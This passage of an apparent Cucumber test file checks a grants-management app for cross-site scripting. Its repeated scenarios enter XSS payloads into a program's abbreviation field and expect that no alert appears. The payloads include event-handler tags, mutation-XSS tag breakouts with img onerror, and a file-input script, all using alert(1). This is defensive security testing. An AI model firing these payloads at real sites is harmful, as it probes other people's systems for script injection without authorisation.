      | <form onsubmit=alert(1)><input type=submit> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300871 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                      | Field                |
      | <body ontouchend=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300872 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                       | Field                |
      | <body ontouchmove=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300873 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                        | Field                |
      | <body ontouchstart=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300874 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                   | Field                |
      | <audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300875 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                   | Field                |
      | <body onwheel=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300877 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                 | Field                |
      | <noembed><img title="</noembed><img src onerror=alert(1)>"></noembed> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300878 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <noscript><img title="</noscript><img src onerror=alert(1)>"></noscript> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300879 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                           | Field                |
      | <style><img title="</style><img src onerror=alert(1)>"></style> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300881 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <script><img title="</script><img src onerror=alert(1)>"></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300882 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <iframe><img title="</iframe><img src onerror=alert(1)>"></iframe> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300884 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <xmp><img title="</xmp><img src onerror=alert(1)>"></xmp> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300888 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300890 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <noframes><img title="</noframes><img src onerror=alert(1)>"></noframes> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300894 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                           | Field                |
      | <title><img title="</title><img src onerror=alert(1)>"></title> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300895 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                                            | Field                |
      | <input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300896 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <script>onerror=alert;throw 1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300897 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
